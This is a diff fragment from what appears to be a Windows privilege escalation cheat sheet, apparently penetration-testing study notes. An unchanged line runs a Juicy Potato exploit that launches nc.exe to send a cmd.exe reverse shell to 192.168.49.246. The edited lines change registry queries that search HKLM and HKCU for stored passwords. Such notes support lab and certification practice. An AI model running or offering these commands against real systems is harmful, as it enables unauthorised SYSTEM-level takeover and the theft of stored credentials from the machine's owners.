@@ -62,8 +62,8 @@ Privilege Escalation:-
 		juc.exe -l 1337 -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\apache\Desktop\nc.exe -e cmd.exe 192.168.49.246 21" //juicy potato for windows 2008
 		
 		
-		reg query HKLM /f password /t REG_SZ /s
-		reg query HKCU /f password /t REG_SZ /s //search for passwords in registry 
+		reg query HKLM /f pass /t REG_SZ /s
+		reg query HKCU /f pass /t REG_SZ /s //search for passwords in registry 
 
  Enumeration:-
  	
